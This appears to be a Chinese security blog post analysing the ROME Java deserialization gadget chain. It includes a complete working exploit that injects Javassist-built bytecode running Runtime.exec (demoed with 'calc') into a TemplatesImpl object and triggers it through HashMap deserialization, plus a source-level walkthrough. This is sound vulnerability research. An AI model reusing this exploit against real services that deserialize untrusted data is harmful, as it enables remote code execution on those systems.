## 前言

ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。

ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。

先配置环境：

```xml
        <!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->
        <dependency>
            <groupId>rome</groupId>
            <artifactId>rome</artifactId>
            <version>1.0</version>
        </dependency>
```

## 利用链&POC

看看yso中的利用链：

```
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
```

手写exp：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import sun.reflect.*;
import javax.xml.transform.Templates;

public class rome {
    //为类的属性设置值
    public static void setValue(Object target, String name, Object value) throws Exception {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }
    //生成恶意的bytecodes
    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("snakin");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("  Runtime.getRuntime().exec(\"" + cmd + "\");" );
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        //因为在TemplatesImp类中的构造函数中，_bytecodes为二维数组
        byte[] code = getTemplatesImpl("calc");
        byte[][] bytecodes = {code};
        //创建TemplatesImpl类
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", bytecodes);
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //封装一个无害的类并放入Map中
        ObjectBean snakin = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "snakin"));
        HashMap hashmap = new HashMap();
        hashmap.put(snakin, "snakin");

        //通过反射写入恶意类进入map中
        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        setValue(snakin, "_equalsBean", new EqualsBean(ObjectBean.class, objectBean));

        //生成payload
        serialize(hashmap);
        //触发payload，验证是否成功
        unserialize("ser.bin");


    }

}
```

## 调试分析

### 前置知识

#### ObjectBean

`com.sun.syndication.feed.impl.ObjectBean` 是 Rome 提供的一个封装类型，初始化时提供了一个 Class 类型和一个 Object 对象实例进行封装。

ObjectBean 也是使用委托模式设计的类，其中有三个成员变量，分别是 EqualsBean/ToStringBean/CloneableBean 类，这三个类为 ObjectBean 提供了 `equals`、`toString`、`clone` 以及 `hashCode` 方法。

来看一下 ObjectBean 的 `hashCode` 方法，会调用 EqualsBean 的 `beanHashCode` 方法。

```java
public int hashCode() {
        return this._equalsBean.beanHashCode();
    }
```

会调用 EqualsBean 中保存的 `_obj` 的 `toString()` 方法。

```java
public int beanHashCode() {
        return this._obj.toString().hashCode();
    }
```

这里为漏洞触发点。

#### ToStringBean

`com.sun.syndication.feed.impl.ToStringBean` 类从名字可以看出，这个类给对象提供 toString 方法，类中有两个 toString 方法，第一个是无参的方法。获取调用链中上一个类或 `_obj` 属性中保存对象的类名，并调用第二个 toString 方法。

```java
public String toString() {
        Stack stack = (Stack)PREFIX_TL.get();
        String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek());
        String prefix;
        if (tsInfo == null) {
            String className = this._obj.getClass().getName();
            prefix = className.substring(className.lastIndexOf(".") + 1);
        } else {
            prefix = tsInfo[0];
            tsInfo[1] = prefix;
        }

        return this.toString(prefix);
    }
```

这个方法会调用 `BeanIntrospector.getPropertyDescriptors()` 来获取 `_beanClass` 的全部 getter/setter 方法，然后判断参数长度为 0 的方法使用 `_obj` 实例进行反射调用，也就是会调用所有 getter 方法拿到全部属性值，然后打印出来。

![image-20220718111230786](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718111230786.png)

获取 getter/setter 方法：

![image-20220718111453087](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718111453087.png)

由此可见，ToStringBean 的 `toString()` 方法可以触发其中 `_obj` 实例的全部 getter 方法，可以用来触发 TemplatesImpl 的利用链。

### 利用分析

从反序列化入口进入，跟进到Hashmap，这里是为了调用hashCode，直接跟进：

```java
 public int hashCode() {
        return _equalsBean.beanHashCode();
    }
```

之前也讲了这一步是为了触发toString()方法，跟进beanHashCode()：

```java
public int beanHashCode() {
        return _obj.toString().hashCode();
    }
```

这里的`_obj`是`ObjectBean`类的对象，调用了他的`toString`方法

```java
public String toString() {
        return this._toStringBean.toString();
    }
}
```

跟进`ObjectBean#toString`方法，这里的`_toStringBean`属性，是`ToStringBean`类的对象，调用了他的`toString`方法

![image-20220718112908441](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220718112908441.png)

这里关键点为`BeanIntrospector.getPropertyDescriptors(this._beanClass)`方法，它的作用是获取类的属性的getter和setter方法，处理方式在前置知识已经阐明。

之后就是正常的`TemplatesImpl`调用链

```
getOutputProperties
    newTransformer
        getTransletInstance
            defineTransletClasses
```

## 总结

以上就是 ROME 链分析的全部内容了，最后总结一下。

1. 利用说明：
   - 利用 HashMap 反序列化触发 ObjectBean 的 hashCode 方法，再触发 ObjectBean 封装的 ObjectBean 的 toString 方法，之后即可触发`      TemplatesImpl`利用链。
2. Gadget 总结：
   - kick-off gadget：`java.util.HashMap#readObject()`
   - sink gadget：`com.sun.syndication.feed.impl.ToStringBean#toString()`
   - chain gadget：`com.sun.syndication.feed.impl.ObjectBean#toString()`
3. 调用链展示：

```
HashMap.readObject()
    ObjectBean.hashCode()
            EqualsBean.beanHashCode()
                ObjectBean.toString()
                    ToStringBean.toString()
                        TemplatesImpl.getOutputProperties()
```

